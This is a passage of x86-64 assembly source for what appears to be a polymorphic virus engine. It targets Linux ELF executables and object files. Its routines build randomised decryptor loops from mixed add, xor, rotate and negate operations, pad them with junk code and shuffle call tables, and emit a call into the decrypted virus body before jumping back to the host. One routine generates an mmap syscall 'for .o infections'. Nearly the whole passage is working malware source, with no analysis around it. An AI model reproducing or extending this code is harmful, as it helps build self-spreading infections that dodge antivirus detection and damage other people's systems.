		INT3_CALL emit_op_F6
		jmp	.do_check
	.test80:INT3_CALL emit_op_80
		jmp	.do_check

	.check_reg:
		mov	dh,[g_poly_o_check_size]
		INT3_CALL alloc_word_reg_DX	; get reg
		cmp	dh,1
		jne	.n20a
		cmp	dl,_SP
		jb	.n20a
		or	dh,0x20
	.n20a:	INT3_CALL rand_prob
		jns	.check_reg_imm		; test r,imm?
		clc	; no xchg
		INT3_CALL load_reg_mem		; load r, test r
		INT3_CALL small_junk
		INT3_CALL gen_test_reg
		jmp	.test_free
	.check_reg_imm:
		INT3_CALL load_reg_nc
		cmp	ch,_AND
		jne	.test_rm
		INT3_CALL rand_prob
		js	.test_rm
		mov	ch,_TEST_rm
		jmp	.op_rr
	.test_rm:
		or	ch,op_mr
	.op_rr:	INT3_CALL emit_op_rr_nc
	.test_free:
		INT3_CALL free_word_reg_DX

	.do_check:
		; Jcc
		lea	rsi,[poly_check_conditions]
		.cl:	mov	al,POLY_CHECK_COND_COUNT
			INT3_CALL rand_al
			mov	ax,[rsi+(rax*2)]
			test	ah,ah
			jz	.cl
		mov	ah,0x80
		or	ah,al
		mov	al,0x0F
		stosw
		mov	[g_poly_o_check_rel32],rdi
		scasd
		INT3_CALL small_junk
		; Set check value
		pop	rdx
		mov	ebx,[g_poly_check_value]
		bt	dword [g_poly_flags],RETAL_POLY_O_SET_REG
		jc	.set_r
		; Set using immediate (no reg)
		xor	dh,0x40^8	;^4
		xor	dh,[g_poly_o_check_size]
		INT3_CALL load_mem_imm
		INT3_CALL small_junk
		jmp	.exit

	.set_r:	; set using reg
		push	rdx
		mov	dh,[g_poly_o_check_size]
		INT3_CALL alloc_word_reg_DX
		cmp	dh,1
		jne	.n20b
		cmp	dl,_SP
		jb	.n20b
		or	dh,0x20
	.n20b:	INT3_CALL load_reg_nc
		INT3_CALL small_junk
		stc	; use XCHG
		INT3_CALL load_mem_reg
		INT3_CALL small_junk
		pop	rdx

	.exit:	INT3_CALL free_all_regs
	.exit2:	multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -gen_o_check
		ret

;-[gen_keymod_crypts]---------------------------------------------------------
; generate series of crypt ops to modify keymod
ADD_FUNCTION
gen_keymod_crypts:
		POLY_DEBUG_STRING *gen_keymod_crypts
		mov	bl,[g_keymod_reg]
		jmp	gen_key_crypts.start_loop

;-[gen_key_crypts]------------------------------------------------------------
; generate series of crypt ops to modify key
ADD_FUNCTION
gen_key_crypts:	POLY_DEBUG_STRING *gen_keymod_crypts
		mov	bl,[g_key_reg]
	.start_loop:
		POLY_DEBUG_STRING +gen_crypt
		BEGIN_EBLOCK_OPCODE
		movzx	rcx,byte [g_o_crypt_level]
		call	zf_if_ofile
		jz	.noexe
		mov	cl,[g_exe_crypt_level]
	.noexe:	mov	al,cl
		INT3_CALL rand_al
		add	cl,al
	.l:	bt	dword [g_poly_flags],RETAL_POLY_MIX_CRYPT_OPS
		jnc	.do_crypt_op
		mov	bl,[g_key_reg]
		INT3_CALL rand_prob
		js	.do_crypt_op
		mov	bl,[g_keymod_reg]
	.do_crypt_op:
		INT3_CALL gen_crypt_op
		INT3_CALL small_junk
		loop	.l
		INT3_CALL big_junk
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -gen_crypts
		ret

;-[gen_call_virus]------------------------------------------------------------
; generate call to virus after decryption
ADD_FUNCTION
gen_call_virus:	POLY_DEBUG_STRING +gen_call_virus
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		mov	eax,[g_poly_entry_offset]
		test	eax,eax
		js	.exit2
		mov	dh,0x88 ; call ptr?
		mov	dl,[g_poly_call_virus_reg]
		test	dl,dl
		js	.no_ptr
		push	rax
		mov	al,dl
		INT3_CALL alloc_regr
		pop	rbx
		movzx	rcx,byte [g_word_size]
		add	rbx,rcx
		bt	dword [g_poly_flags],RETAL_POLY_BACKWARDS
		jc	.ptr_call
		sub	rbx,[g_poly_in_size]
		sub	rbx,rcx
	.ptr_call:
		jmp	.call_reg_with_rbx
	.no_ptr:mov	dh,8
		INT3_CALL alloc_word_reg_DX
		INT3_CALL zf_if_ofile
		je	.do_o
		add	rax,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		INT3_CALL rand_prob
		js	.exe_call_reg
		POLY_DEBUG_STRING *do E8
		push	rax
		mov	al,0xE8		; do 0xE8 imm32
		stosb
		push	rdi
		pop	rbx
		pop	rax
		INT3_CALL set_rel32
		scasd
		jmp	.exit
	.exe_call_reg:
		POLY_DEBUG_STRING *exe call reg
		INT3_CALL rax_to_vaddr	; Load REG64, call REG64
		push	rax
		pop	rbx
		INT3_CALL load_reg_nc
		jmp	.do_call_reg
	.do_o:	POLY_DEBUG_STRING *do_o
		push	rax
		pop	rbx
		mov	ch,8
		INT3_CALL emit_op_50	; .o: pop dest ptr, add offset, call REG64
	.call_reg_with_rbx:
		INT3_CALL small_junk
		test	rbx,rbx
		jz	.do_call_reg
		mov	ch,_ADD
		INT3_CALL rand_prob
		jpe	.no_sub
		mov	ch,_SUB
		neg	rbx
	.no_sub:INT3_CALL emit_op_80
	.do_call_reg:
		INT3_CALL small_junk
		mov	ch,_CALLN
		INT3_CALL emit_op_FE
	.exit:	call	free_word_reg_DX
		INT3_CALL big_junk
	.exit2:	multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_call_virus
		ret

;-[gen_loop_branch]-----------------------------------------------------------
; generate inc/dec/add/sub count, [test reg], Jx loop start
ADD_FUNCTION
gen_loop_branch2:POLY_DEBUG_STRING +gen_loop_branch2
		POLY_DEBUG_RDI_R13
		multipush rax,rbx,rcx,rdx,rsi,r8
		BEGIN_EBLOCK_OPCODE
		mov	rax,[g_loop_method]
		mov	dx,[g_count_reg]
		bt	dword [g_poly_flags],RETAL_POLY_INC
		setc	r14b
		mov	r15b,1
		INT3_CALL gen_loop_branch
		mov	al,0x80
		or	al,r8b
		mov	ah,0x0F
		xchg	al,ah
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		mov	[r13],ax
		push	rax
		lea	rbx,[r13+2]
		mov	rax,[g_poly_eloop_start]
		INT3_CALL set_rel32
		add	r13,6
		pop	rax
		xor	rsi,rsi
		bt	dword [g_poly_flags],RETAL_POLY_INVERT_LOOP
		jc	.do_E9
		stosw
		jmp	.do_rel32
	.do_E9:	mov	al,0x80^0x70^0x1	; Inverse condition 7x
		xor	al,ah
		stosw
		push	rdi
		pop	rsi
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		INT3_CALL junk_127
		btr	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		mov	al,0xE9
		stosb
	.do_rel32:
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		push	rdi
		pop	rbx
		mov	rax,[g_poly_dloop_start]
		INT3_CALL set_rel32
		scasd
		test	rsi,rsi
		jz	.exit
		push	rdi
		pop	rax
		sub	rax,rsi
		mov	[rsi-1],al
	.exit:	btr	dword [g_poly_flags],RETAL_POLY_IN_LOOP
		call	free_all_regs
		mov	al,[g_poly_call_virus_reg]
		test	al,al
		js	.junk
		INT3_CALL alloc_regr
	.junk	INT3_CALL zf_if_ofile
		jz	.nsj
		bts	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
	.nsj:	INT3_CALL big_junk
		multipop rax,rbx,rcx,rdx,rsi,r8
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_loop_branch2
		ret

;-[inc_dest_reg]--------------------------------------------------------------
; increase dest ptr (if used) by word size
ADD_FUNCTION
inc_dest_reg:	POLY_DEBUG_STRING *inc_dest_reg
		mov	dl,[g_dest_reg]
		mov	cl,[g_src_reg]
		test	byte [g_poly_flags],bit(RETAL_POLY_PTR_INC_MOV)|bit(RETAL_POLY_SRC_INC)
		jmp	inc_src_reg.mov_test

;-[inc_src_reg]---------------------------------------------------------------
; increase source ptr by word size
ADD_FUNCTION
inc_src_reg:	POLY_DEBUG_STRING *inc_src_reg
		mov	dl,[g_src_reg]
		mov	cl,[g_dest_reg]
		test	byte [g_poly_flags],bit(RETAL_POLY_PTR_INC_MOV)|bit(RETAL_POLY_DEST_INC)
	.mov_test:
		mov	dh,0x88
		mov	bl,[g_word_size]
		jz	gen_ptr_add
		jpo	gen_ptr_add
		call	zf_if_ofile
		jz	gen_ptr_add
		call	cf_if_dest
		jnc	gen_ptr_add
		POLY_DEBUG_STRING *inc_ptr_mov
		or	cl,0x80
		INT3_CALL load_reg_reg
	.do_r13:xchg	rdi,r13
		mov	ch,_ADD
		and	rbx,7
		bt	dword [g_poly_flags],RETAL_POLY_BACKWARDS
		jnc	.do80
		mov	ch,_SUB
	.do80:	INT3_CALL emit_op_80
		xchg	rdi,r13
		ret

;-[gen_ptr_add]---------------------------------------------------------------
; add word size to 64-bit rex reg in dl
ADD_FUNCTION
gen_ptr_add:	POLY_DEBUG_STRING +gen_ptr_add
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rsi,r8,r9
		movzx	esi,bl
		call	inc_src_reg.do_r13
		mov	eax,RETAL_POLY_SRC_INC
		cmp	dl,[g_dest_reg]
		jne	.set_flag
		;mov	eax,RETAL_POLY_DEST_INC
		mov	al,RETAL_POLY_DEST_INC
		INT3_CALL cf_if_dest
		jnc	.exit
	.set_flag:
		;or	[g_poly_flags],eax
		bts	dword [g_poly_flags],eax
		.l:	INT3_CALL rand_prob
			js	.do_add
			mov	ch,_INC		; do INC
			bt	dword [g_poly_flags],RETAL_POLY_BACKWARDS
			jnc	.inc
			mov	ch,_DEC
		.inc:	INT3_CALL emit_op_FE
			dec	esi
			jmp	.next
		.do_add:mov	ch,_ADD		; do ADD/SUB
			push	rsi
			pop	rax
			INT3_CALL rand
			inc	eax
			push	rax
			push	rax
			pop	rbx
			INT3_CALL rand_prob
			js	.no_sub
			mov	ch,_SUB
			neg	rbx
		.no_sub:bt	dword [g_poly_flags],RETAL_POLY_BACKWARDS
			jnc	.do80
			neg	rbx
		.do80:	INT3_CALL emit_op_80
			pop	rax
			sub	esi,eax
		.next:	INT3_CALL small_junk
			test	esi,esi
			jnz	.l
		INT3_CALL big_junk
	.exit:	multipop rax,rbx,rcx,rsi,r8,r9
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_ptr_add
		ret

;-[gen_return_rip]------------------------------------------------------------
; jmp to return (input) RIP
ADD_FUNCTION
gen_return_rip:	POLY_DEBUG_STRING +gen_return_rip
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		bt	dword [g_poly_flags],RETAL_POLY_RETURN_RIP_E9
		jnc	.do_ff
		mov	al,0xE9
		stosb
		INT3_CALL zf_if_ofile
		jz	.do_E9_o
		lea	rbx,[rdi+4]
		sub	rbx,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		add	rbx,[g_poly_load_addr]
		mov	rax,[g_poly_in_rip]
		sub	rax,rbx
		;stosd
		jmp	.stosd_exit
	.do_E9_o:
		lea	rax,[rdi+4]
		INT3_CALL rax_to_vaddr
		mov	rbx,[g_func_sym_entry]
		mov	rbx,[rbx+Elf64_Sym.st_value]
		sub	rax,rbx
		neg	rax
	.stosd_exit:
		stosd
		jmp	.exit
	.do_ff: mov	al,0xFF
		mov	ah,_JMPN + 5
		INT3_CALL rand_prob
		js	.ff_jmp
		mov	ah,_PUSH + 5
	.ff_jmp:stosw
		push	rdi
		scasd
		cmp	ah,_PUSH + 5
		jne	.ff_no_ret
		INT3_CALL small_junk
		mov	al,0xC3
		stosb
	.ff_no_ret:
		;INT3_CALL big_junk
		INT3_CALL small_junk
		pop	rbx
		push	rdi
		pop	rax
		call	set_rel32
		mov	rax,[g_poly_in_rip]
		call	zf_if_ofile
		jnz	.ff_stosq
		; store function return reloc here
		push	rdi
		pop	rax
		INT3_CALL rax_to_vaddr
		mov	[reloc_offset_func],rax
		xor	rax,rax
	.ff_stosq:
		stosq

	.exit:	;INT3_CALL big_junk
		INT3_CALL small_junk
		mov	byte [r13],0xC3	; retn in encryptor
		inc	r13
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_return_rip
		ret

;-[gen_text_crypt]------------------------------------------------------------
; add/sub/xor textreg,keyreg and inverse in encryptor
ADD_FUNCTION
gen_text_crypt:	POLY_DEBUG_STRING +gen_text_crypt
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rdx,rcx
		mov	dl,[g_text_reg]
		mov	dh,[g_word_size]
		mov	cl,[g_key_reg]
		mov	ch,[g_poly_text_crypt_op]
		xchg	rdi,r13
		INT3_CALL emit_op_rr_nc
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		xchg	rdi,r13
		cmp	ch,_XOR
		je	.xor
		xor	ch,_ADD^_SUB
	.xor:	INT3_CALL emit_op_rr_nc
		INT3_CALL big_junk
		multipop rdx,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_text_crypt
		ret

;-[gen_crypt_op]--------------------------------------------------------------
; generate single crypt op.
; bl = key/keymod register.
ADD_FUNCTION
gen_crypt_op:	POLY_DEBUG_STRING +gen_crypt_op_new
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		cmp	bl,-1
		je	.double_exit
		multipush rax,rbx,rcx,rdx,rbp,r8,r9
		push	rdi
		mov	r9d,0xFFFF		; case 16-bit
		mov	dl,[g_word_size]
		mov	r8b,dl
		cmp	dl,2
		je	.got_mask
		ja	.mask4
		shr	r9d,8			; case 8-bit
		jmp	.got_mask
	.mask4:	push	-1			; case 32-bit
		pop	r9
	.got_mask:
		shl	r8b,3
		dec	r8b			; shift/rot mask
		mov	cl,[g_keymod_reg]
		cmp	cl,bl
		jne	.use_keymod_reg
		mov	cl,-1
	.use_keymod_reg:
		mov	ch,[g_count_reg]
		cmp	dl,1
		jne	.try_count_size
		cmp	ch,_BX
		jb	.use_count_reg
		jmp	.no_count
	.try_count_size:
		cmp	dl,[g_count_size]
		jbe	.use_count_reg
	.no_count:
		mov	ch,-1
	.use_count_reg:
		mov	al,4		; [add/sub]/xor(imm)/[rol/ror](imm)/[not/neg]
		cmp	cx,-1
		je	.no_cl_ch
		add	al,2		; [add/sub]/xor(reg)
		cmp	cl,_CX
		je	.use_cl
		cmp	ch,_CX
		jne	.no_cl
	.use_cl:inc	al		; [rol/ror](cl)
	.no_cl:	cmp	cl,-1
		jne	.reg_cl
		mov	cl,ch
	.reg_cl:cmp	ch,-1
		jne	.no_ch
		mov	ch,cl
	.no_ch:	INT3_CALL rand_prob	; cl = 2nd register arg
		js	.no_cl_ch
		xchg	cl,ch
	.no_cl_ch:
		mov	dh,dl		; dx = target reg
		mov	dl,bl
		movzx	rbp,al
	.bx_l:	INT3_CALL rand_any
		and	eax,r9d
		jz	.bx_l
		push	rax
		pop	rbx
	.choose:push	rbp
		pop	rax
		INT3_CALL rand
		mov	r9b,[last_crypt_type]
		jz	.add_sub_imm
		dec	eax
		jz	.xor_imm
		dec	eax
		jz	.rol_ror_imm
		dec	eax
		jz	.not_neg
		dec	eax
		jz	.add_sub_reg
		dec	eax
		jz	.xor_reg
		jmp	.rol_ror_cl
	.exit:	mov	[last_crypt_type],al
		pop	r12
		INT3_CALL copy_from_r12
		multipop rax,rbx,rcx,rdx,rbp,r8,r9
	.double_exit:
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_crypt_op
		ret

	.add_sub_imm:
		mov	al,CRYPT_ADD
		test	r9b,al
		jnz	.choose
		mov	ch,_ADD
		INT3_CALL rand_prob
		jns	.op80
		mov	ch,_SUB
	.op80:	INT3_CALL emit_op_80
		jmp	.exit

	.xor_imm:
		mov	al,CRYPT_XOR
		test	r9b,al
		jnz	.choose
		mov	ch,_XOR
		jmp	.op80

	.rol_ror_imm:
		mov	al,CRYPT_ROT
		test	r9b,al
		jnz	.choose
		test	bl,r8b
		jz	.choose
		INT3_CALL rand_prob
		jbe	.no_rot_1
		mov	bl,1
	.no_rot_1:
		mov	ch,_ROL
		;INT3_CALL rand_prob
		js	.doC0
		mov	ch,_ROR
	.doC0:	clc		; mask lower bits
		INT3_CALL emit_op_C0
		jmp	.exit

	.not_neg:
		mov	al,CRYPT_NOT
		test	r9b,al
		jnz	.choose
		mov	ch,_NOT
		INT3_CALL rand_prob
		js	.doF6
		mov	ch,_NEG
	.doF6:	INT3_CALL emit_op_F6
		jmp	.exit

	.add_sub_reg:
		mov	al,CRYPT_ADD
		test	r9b,al
		jnz	.choose
		mov	ch,_ADD
		INT3_CALL rand_prob
		jns	.oprr
		mov	ch,_SUB
	.oprr:	INT3_CALL emit_op_rr_nc
		jmp	.exit

	.xor_reg:
		mov	al,CRYPT_XOR
		test	r9b,al
		jnz	.choose
		mov	ch,_XOR
		jmp	.oprr

	.rol_ror_cl:
		mov	al,CRYPT_ROT
		test	r9b,al
		jnz	.choose
		mov	ch,_ROL|sh_cl
		INT3_CALL rand_prob
		js	.doC0
		mov	ch,_ROR|sh_cl
		jmp	.doC0


last_crypt_type:	db	0

;-[rax_to_vaddr]--------------------------------------------------------------
; convert value of rax in output buffer to virtual address.
; absolute virtual address for executables.
; offset in .text for .o files
ADD_FUNCTION
rax_to_vaddr:	POLY_DEBUG_STRING +rax_to_vaddr
		BEGIN_EBLOCK_OPCODE
		sub	rax,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		add	rax,[g_poly_load_addr]
		call	zf_if_ofile
		jnz	.exit
		sub	rax,[g_poly_in_size]
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -rax_to_vaddr
		ret

;-[copy_from_r12]-------------------------------------------------------------
; copy code r12-rdi to r13
ADD_FUNCTION
copy_from_r12:	POLY_DEBUG_STRING +copy_from_r12
		BEGIN_EBLOCK_OPCODE
		multipush rdi,rcx,rsi
		push	rdi
		pop	rcx
		sub	rcx,r12
		jz	.exit
		mov	rsi,r12
		mov	rdi,r13
		rep	movsb
		mov	r13,rdi
	.exit:	multipop rdi,rcx,rsi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -copy_from_r12
		ret

;-[shuffle_call_table]--------------------------------------------------------
; shuffle addresses in call table.
; rsi = table, bl = number of addresses in table.
ADD_FUNCTION
shuffle_call_table:
		POLY_DEBUG_STRING +shuffle_call_table
		BEGIN_EBLOCK_OPCODE
		multipush rax,rdx,rcx
		push	64
		pop	rcx
	.l:		mov	al,bl
			INT3_CALL rand_al
			mov	dx,[rsi]
			xchg	dx,[rsi+(rax*2)]
			mov	[rsi],dx
			loop	.l
		multipop rax,rdx,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -shuffle_call_table
		ret

;-[call_table_all]------------------------------------------------------------
; call all routines in call table
; rsi = table, rcx = number of addresses in table.
ADD_FUNCTION
call_table_all:	POLY_DEBUG_STRING +call_table_all
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rsi
		cld
		push	rsi
		pop	rbx
	.l:		lodsw
			xor	ax,CALL_TABLE_XOR
			movsx	rax,ax
			add	rax,rbx
			multipush rbx,rcx,rsi
			call	rax
			multipop rbx,rcx,rsi
			loop	.l
		multipop rax,rbx,rcx,rsi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -call_table_all
		ret

;-[call_table_rand]-----------------------------------------------------------
; call random item from call table in rax.
; rsi = table, al = number of addresses in table.
ADD_FUNCTION
call_table_rand:POLY_DEBUG_STRING +call_table_rand
		call 	rand_al
		mov	ax,[rsi+(rax*2)]
		xor	ax,CALL_TABLE_XOR
		movsx	rax,ax
		add	rax,rsi
		call	rax
		POLY_DEBUG_STRING -call_table_rand
		ret

;-[load_loop_registers]-------------------------------------------------------
; initialize registers before loop
ADD_FUNCTION
load_loop_registers:
		POLY_DEBUG_STRING +load_loop_registers
		BEGIN_EBLOCK_OPCODE
		lea	rsi,[LOAD_LOOP_CALL_TABLE]
		push	LOAD_LOOP_CALL_TABLE_COUNT
		pop	rcx
		INT3_CALL call_table_all
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_loop_registers
		ret

BEGIN_CALL_TABLE LOAD_LOOP_CALL_TABLE
	CALL_TABLE_ITEM	load_count
	CALL_TABLE_ITEM	load_key
	CALL_TABLE_ITEM load_keymod
	CALL_TABLE_ITEM load_source
	CALL_TABLE_ITEM load_dest
END_CALL_TABLE

ADD_FUNCTION
load_count:	POLY_DEBUG_STRING +load_count
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	dx,[g_count_reg]
		mov	al,dl
		INT3_CALL alloc_regw
		mov	ebx,[g_poly_in_size]
		cmp	byte [g_word_size],2
		jb	.got_rbx	; byte size?
		je	.do16		; word size?
		shr	ebx,1		; dword size
	.do16:	shr	ebx,1
	.got_rbx:
		mov	rax,[g_loop_method]
		bt	dword [g_poly_flags],RETAL_POLY_INC
		setc	r14b
		INT3_CALL load_loop_count
		xchg	r13,rdi
		INT3_CALL emit_op_B0
		xchg	r13,rdi
		INT3_CALL big_junk
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -load_count
		ret

ADD_FUNCTION
load_key:	POLY_DEBUG_STRING +load_key
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		mov	al,[g_key_reg]
		INT3_CALL alloc_reg_text
		mov	dl,al
		mov	dh,[g_word_size]
		mov	ebx,[g_key_init_value]
		push	rbx
		pop	rbp
		INT3_CALL load_reg_cf
		INT3_CALL big_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -load_key
		ret

ADD_FUNCTION
load_keymod:	POLY_DEBUG_STRING +load_keymod
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,[g_keymod_reg]
		cmp	al,-1
		je	.exit
		INT3_CALL alloc_reg_text
		mov	dl,al
		mov	dh,[g_word_size]
		mov	ebx,[g_keymod_init_value]
		push	rbx
		pop	rbp
		INT3_CALL load_reg_cf
		INT3_CALL big_junk
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -load_keymod
		ret

ADD_FUNCTION
load_source:	POLY_DEBUG_STRING +load_source
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,[g_src_reg]
		INT3_CALL alloc_regr
		mov	dl,al
		mov	dh,0x88
		INT3_CALL zf_if_ofile
		jne	.do_exec
		xor	rbx,rbx
		INT3_CALL emit_op_B0
		; save offset of source reloc (virus in .data)
		lea	rax,[rdi-8]
		call	rax_to_vaddr
		mov	[reloc_offset_source],rax
		jmp	.do_set
	.do_exec:
		test	byte [g_poly_flags],bit(RETAL_POLY_DEST_SET)|bit(RETAL_POLY_MOV_PTR_PTR)
		jz	.do_imm
		jpo	.do_imm
		mov	cl,0x80
		or	cl,[g_dest_reg]
		INT3_CALL load_reg_reg
		jmp	.do_set
	.do_imm:mov	rbx,[g_poly_load_addr]
		add	rbx,[g_poly_data_offset]
		INT3_CALL load_reg_nc
	.do_set:bts	dword [g_poly_flags],RETAL_POLY_SRC_SET
		xchg	rdi,r13		; load source in encryptor
		mov	rbx,[g_VirusBody_Handle+MALLOC_HANDLE.addr]
		add	rbx,[g_poly_data_offset]
		INT3_CALL emit_op_B0
		xchg	rdi,r13
		INT3_CALL big_junk
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -load_source
		ret

ADD_FUNCTION
load_dest:	POLY_DEBUG_STRING +load_dest
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		mov	al,[g_dest_reg]
		mov	dl,al
		mov	dh,0x88
		INT3_CALL zf_if_ofile
		je	.do_o
		INT3_CALL cf_if_dest
		jnc	.do_r13
		INT3_CALL alloc_regr
		test	byte [g_poly_flags],bit(RETAL_POLY_SRC_SET)|bit(RETAL_POLY_MOV_PTR_PTR)
		jz	.do_imm
		jpo	.do_imm

		mov	cl,0x80
		or	cl,[g_src_reg]
		INT3_CALL load_reg_reg
		jmp	.do_set
	.do_imm:mov	rbx,[g_poly_load_addr]
		add	rbx,[g_poly_data_offset]
		INT3_CALL load_reg_nc
		jmp	.do_set
	.do_o:	INT3_CALL gen_mmap
	.do_set:bts	dword [g_poly_flags],RETAL_POLY_DEST_SET
	.do_r13:xchg	rdi,r13		; load dest in encryptor
		mov	rbx,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		add	rbx,[g_poly_data_offset]
		INT3_CALL emit_op_B0
		xchg	rdi,r13
		INT3_CALL big_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -load_dest
		ret

;-[gen_load_text]-------------------------------------------------------------
; load text reg from src reg
ADD_FUNCTION
gen_load_text:	POLY_DEBUG_STRING +gen_load_text
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx,r12
		mov	al,[g_text_reg]
		INT3_CALL alloc_reg_text
		mov	dl,al
		mov	dh,[g_word_size]
		mov	cl,0x80+0x40
		or	cl,[g_src_reg]
		stc	; use XCHG
		INT3_CALL load_reg_mem
	.exit:	mov	ch,_MOV_rm
		xchg	rdi,r13
		INT3_CALL emit_op_rr_nc
		xchg	rdi,r13
		INT3_CALL big_junk
		multipop rax,rbx,rcx,rdx,r12
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_load_text
		ret

;-[gen_store_text]------------------------------------------------------------
; store [dest] from text reg
ADD_FUNCTION
gen_store_text:	POLY_DEBUG_STRING +gen_store_text
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx,r12
		mov	dl,[g_text_reg]
		mov	dh,[g_word_size]
		mov	cl,0x80+0x40
		INT3_CALL cf_if_dest
		jnc	.src
		or	cl,[g_dest_reg]
		jmp	.store
	.src:	or	cl,[g_src_reg]
	.store:	stc	;  use XCHG
		INT3_CALL load_mem_reg
	.exit:	mov	ch,_MOV_rm|op_mr
		mov	cl,[g_dest_reg]
		or	cl,0x40+0x80
		xchg	rdi,r13
		INT3_CALL emit_op_rr_nc
		xchg	rdi,r13
		INT3_CALL big_junk
		multipop rax,rbx,rcx,rdx,r12
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -gen_store_text
		ret

;-[gen_mmap]------------------------------------------------------------------
; generate mmap INT3_CALL for .o infections
ADD_FUNCTION
gen_mmap:	POLY_DEBUG_STRING +gen_mmap
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx,rdx,rsi
						; set rex reg mask
		mov	ah,(1 << _R8)\
			| (1 << _R9)\
			| (1 << _R10)\
			| (1 << _R11)
		mov	cl,[g_dest_reg]		; remove dest reg
		mov	al,1
		shl	al,cl
		not	al
		and	ah,al						; set word reg mask
		mov	al,(1 << _AX)\
			| (1 << _CX)\
			| (1 << _DX)\
			| (1 << _SI)\
			| (1 << _DI)
		INT3_CALL push_used_regs	; pushes
		push	rax
		push	MMAP_CALL_TABLE_COUNT	; load regs
		pop	rcx
		lea	rsi,[MMAP_CALL_TABLE]
		INT3_CALL call_table_all
		INT3_CALL emit_syscall
		mov	al,[g_dest_reg]		; mov dest,rax
		INT3_CALL alloc_regr
		INT3_CALL small_junk
		mov	dl,al
		mov	dh,0x88
		xor	cl,cl	; rax
		call	load_reg_reg
		INT3_CALL small_junk
		INT3_CALL alloc_regr
		pop	rbx			; get reg mask
		INT3_CALL pop_used_regs		; pops
		; check ptr for error/branch/push dest
		INT3_CALL mmap_error_check
		mov	al,0x0F
		stosw
		mov	[g_poly_mmap_rel32],rdi
		scasd
		INT3_CALL small_junk
		bt	dword [g_poly_flags],RETAL_POLY_CALL_VIRUS_PTR
		jc	.no_push
		mov	al,0x41
		stosb
		mov	al,[g_dest_reg]
		or	al,0x50
		stosb
		INT3_CALL small_junk
	.no_push:
		mov	ebx,[g_poly_data_offset]
		test	ebx,ebx
		jz	.exit
		mov	ch,_ADD
		INT3_CALL rand_prob
		js	.do80
		mov	ch,_SUB
		neg	rbx
	.do80:	INT3_CALL emit_op_80
		INT3_CALL small_junk
	.exit:	multipop rax,rcx,rbx,rdx,rsi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -gen_mmap
		ret

BEGIN_CALL_TABLE MMAP_CALL_TABLE
	CALL_TABLE_ITEM mmap_ax
	CALL_TABLE_ITEM mmap_di
	CALL_TABLE_ITEM mmap_si
	CALL_TABLE_ITEM mmap_dx
	CALL_TABLE_ITEM mmap_r10
	CALL_TABLE_ITEM mmap_r8
	CALL_TABLE_ITEM mmap_r9
END_CALL_TABLE

ADD_FUNCTION
mmap_ax:	POLY_DEBUG_STRING *mmap_ax
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,_AX		; sys_mmap - 9
		INT3_CALL alloc_regw
		mov	dl,al
		mov	dh,0x8
		push	09
		pop	rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		END_EBLOCK_OPCODE
		ret

